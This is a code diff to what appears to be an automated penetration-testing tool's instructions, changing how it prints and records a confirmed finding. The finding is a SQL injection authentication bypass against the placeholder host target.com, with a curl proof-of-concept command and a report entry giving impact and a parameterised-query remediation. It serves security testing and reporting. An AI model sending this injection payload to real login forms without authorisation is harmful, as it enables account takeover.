@@ -164,8 +164,12 @@ INLINE PRINT PATTERN — every time a finding is confirmed:
   print(f"URL:      https://target.com/login")
   print(f"Method:   POST")
   print(f"Payload:  username=' OR '1'='1' --  |  password=x")
-  print(f"Status:   {r.status_code}  |  Size: {len(r.text)} bytes")
-  print(f"Evidence (full response):")
+  print(f"Status-Code: {r.status_code}")
+  # Print FULL response headers — this is MANDATORY for the report POC section
+  print("Response Headers:")
+  for _hdr_name, _hdr_val in r.headers.items():
+      print(f"  {_hdr_name}: {_hdr_val}")
+  print(f"Response (body):")
   print(r.text[:3000])   # ← print UP TO 3000 chars — show real server output, not a snippet
   print("-" * 70)
   # Build curl POC with real cookies and real URL
@@ -175,11 +179,11 @@ INLINE PRINT PATTERN — every time a finding is confirmed:
       _cstr = '; '.join(f'{c.name}={c.value}' for c in _G['session'].cookies)
       _cookie_flag = f' \\\n  -b "{_cstr}"'
   _curl_poc = f'''UA="{_UA}"
-curl -sk -A "$UA" -X POST "https://target.com/login"{_cookie_flag} \\
+curl -sk -D- -A "$UA" -X POST "https://target.com/login"{_cookie_flag} \\
   -H "Content-Type: application/x-www-form-urlencoded" \\
   --data-urlencode "username=' OR '1'='1' --" \\
   -d "password=x" -L -w "\\nFinal URL: %{{url_effective}}"
-# Expected: Final URL: https://target.com/dashboard — authenticated without valid credentials'''
+# Expected: Full response with headers + body showing auth bypass'''
   print(f"curl POC:\n{_curl_poc}")
   print("=" * 70)
 
@@ -202,9 +206,12 @@ curl -sk -A "$UA" -X POST "https://target.com/login"{_cookie_flag} \\
     data={'username': "' OR '1'='1' --", 'password': 'x'},
     allow_redirects=True, verify=False)
 print(r.status_code, r.url)""",
-      # Raw HTTP request details
+      # Raw HTTP request with full headers
       'request':       f"POST /login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=' OR '1'='1' --&password=x",
-      'response':      r.text,
+      # FULL response with HTTP status + headers + body — MANDATORY for professional report
+      'status_code':   str(r.status_code),
+      'response_headers': '\n'.join(f'{k}: {v}' for k, v in r.headers.items()),
+      'response':      f"HTTP/1.1 {r.status_code}\n" + '\n'.join(f'{k}: {v}' for k, v in r.headers.items()) + "\n\n" + r.text,
       'impact':        'Authentication bypass — attacker can log in as any user without a valid password',
       'remediation':   'Use parameterised queries / prepared statements. Never concatenate user input into SQL strings.',
   })
